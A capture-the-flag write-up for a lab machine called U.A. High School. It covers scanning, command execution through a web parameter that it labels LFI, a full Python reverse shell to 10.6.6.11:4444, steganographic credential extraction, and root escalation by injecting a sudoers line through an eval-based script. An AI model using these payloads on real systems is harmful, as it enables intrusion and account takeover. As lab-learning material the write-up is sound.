# U.A. High School CTF Write-Up

## Overview
This write-up details the **compromise of the U.A. High School machine**, beginning with **reconnaissance** and leading to **privilege escalation**. The objective was to gain initial access as `deku` and escalate privileges to **root**.

---

## 🔎 Reconnaissance
We started by scanning the target to identify open ports:
```bash
nmap -sS -oN nmap_initial.txt school.thm
nmap -A -p80 -oN nmap_http.txt school.thm
```
Findings:
✅ Open **SSH and HTTP ports**  
✅ Apache web server running  
✅ `/assets` and `/server-status` directories discovered via `gobuster`

---

## 🛠 Exploiting LFI (Local File Inclusion)
We found an **LFI vulnerability** in `index.php`:
```bash
http://school.thm/assets/index.php?cmd=whoami
# Output: d3d3LWRhdGEK (base64 decoded → `www-data`)
```
Exploiting LFI further:
```bash
http://school.thm/assets/index.php?cmd=cat /etc/apache2/sites-enabled/000-default.conf
```
Using LFI for **reverse shell execution**:
```bash
http://school.thm/assets/index.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.6.11",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
```

---

## 💻 Reverse Shell Stabilization
Once inside, we stabilized our access:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
```
Confirming access:
```bash
whoami && hostname
# Output: www-data@myheroacademia
```

---

## 🔍 User Enumeration
Checking for users:
```bash
cat /etc/passwd | cut -d: -f1
```
Discovered **user `deku`**. Attempted login via:
```bash
su - deku  # Failed
ssh deku@school.thm  # Failed
```
Found **a hidden passphrase file**:
```bash
cat /var/www/Hidden_Content/passphrase.txt
# Decoded Output: AllmightForEver!!!
```

---

## 📷 Image Analysis & Credential Extraction
A **hidden image (`oneforall.jpg`)** was discovered:
1. **Downloaded image** → `wget http://school.thm/assets/images/oneforall.jpg`
2. **Metadata analysis** → `exiftool oneforall.jpg` (misclassified as PNG)
3. **Hex edited to restore as JPEG**
4. **Steganography extraction** → `steghide extract -sf oneforall.jpg`
   - Passphrase: `AllmightForEver!!!`
   - Extracted credentials: `One?For?All_!!one1/A`

---

## 🔑 Obtaining User Flag
Using extracted credentials:
```bash
ssh deku@school.thm
```
Confirming access:
```bash
sudo -l
```
Retrieving `user.txt`:
```bash
cat /home/deku/user.txt
# Output: THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
```

---

## 🚀 Privilege Escalation
Examining `feedback.sh`:
```bash
cat /opt/NewComponent/feedback.sh
```
Key vulnerability: **Use of `eval`, allowing potential command injection**.

Injected privilege escalation payload:
```bash
echo 'deku ALL=NOPASSWD: ALL >> /etc/sudoers' | sudo /opt/NewComponent/feedback.sh
```
Checking sudo permissions:
```bash
sudo -l
# Output: (root) NOPASSWD: ALL
```

Final escalation:
```bash
sudo /bin/bash
whoami
# Output: root
```
Retrieving `root.txt`:
```bash
cat /root/root.txt
# Output: THM{Y0U_4r3_7h3_NUm83r_1_H3r0}
```

---

## 🎯 Conclusion
This challenge was tackled **methodically**, leveraging:
✅ **LFI exploitation**  
✅ **Reverse shell stabilization**  
✅ **Credential extraction via steganography**  
✅ **Privilege escalation via `feedback.sh` injection**  

Final achievements:
✅ **Root access obtained**  
✅ **User & root flags captured**  


